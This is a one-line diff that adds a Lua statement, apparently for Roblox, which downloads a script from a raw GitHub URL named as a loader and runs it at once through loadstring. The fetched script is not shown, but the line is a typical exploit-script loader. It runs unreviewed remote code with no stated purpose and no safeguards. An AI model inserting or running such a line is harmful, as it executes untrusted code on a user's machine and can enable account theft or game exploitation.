@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/wanted-update-spam6-j59b6yvjieusjh.lua"))()
